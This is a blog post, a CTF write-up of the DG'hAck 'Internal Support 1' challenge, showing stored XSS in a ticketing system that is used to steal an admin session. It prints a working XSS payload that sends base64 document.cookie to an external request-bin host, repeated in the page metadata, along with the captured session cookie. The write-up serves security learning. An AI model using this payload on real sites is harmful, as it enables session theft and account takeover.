<!doctype html><html lang=en><head><title>Writeup DG'hAck: Internal Support 1 :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
Trying a classic xss (&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-internal-support-1/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup DG'hAck: Internal Support 1"><meta property="og:description" content="The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
Trying a classic xss (&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :"><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-internal-support-1/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-11-19 03:19:55 +0100 CET"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/>About</a></li><li><a href=/blog>Blog</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/>About</a></li><li><a href=/blog>Blog</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-1/>Writeup DG&rsquo;hAck: Internal Support 1</a></h1><div class=post-meta><span class=post-date>2020-11-19</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content><div><p>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :</p><p><a href=/assets/dghack/internal-support-1.png><img src=/assets/dghack/internal-support-1.png alt="The ticketing system"></a></p><p>Trying a classic xss (<code>&lt;script>alert(1)&lt;/script></code>) in the message field seems to work. We know that we have to login as an admin user, so let&rsquo;s try stealing the cookies :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;document.body.innerHTML=document.body.innerHTML.concat(&#39;&lt;img src=\&#39;https://eni7j9jobszxl.x.pipedream.net/&#39;.concat(btoa(document.cookie)).concat(&#39;\&#39; /&gt;&#39;))&#34;</span> /&gt;
</span></span></code></pre></div><p>After a few seconds, we get a request on our <a href=https://requestbin.com/>request bin</a>, which when decoded gives us the admin cookie :</p><pre tabindex=0><code>session=.eJwlTstqwzAQ_BWhcyh67UryV_RegllJu7GpGxfLOYX8exV6GubBzDz1LBv1hbuevp5anQP0D_dON9YX_bkxdVbbflPrXZ27olqHqc5l7ep3ZD709XW9jJKD-6Kn83jwYGvTk84VfCkhQ7NoI7GLVhJF8hhNDcEEtFnQCOWYoIENURoKtoQ1coiGjA8sAi65VFMBahElo1gStozZZxYKxgGERpliDNYTChQoBkuDcX9-dD7-39hBaz9kPvdvvg-hgpTkjBPyb_RUGZhqhOxbDqW9h5EI9OsP9hJWpw.X7XZVw.vQUecnJN2gaDUDDYuPeB5LNZbbg
</code></pre><p>Logging in using that cookie reveals this todo-list :</p><p><a href=/assets/dghack/internal-support-1-todo.png><img src=/assets/dghack/internal-support-1-todo.png alt="The admin&amp;rsquo;s todo list"></a></p><p>Which contains the flag: <code>NoUserValidationIsADangerousPractice</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/><span class=button__icon>←</span>
<span class=button__text>Writeup DG'hAck: Internal Support 2</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>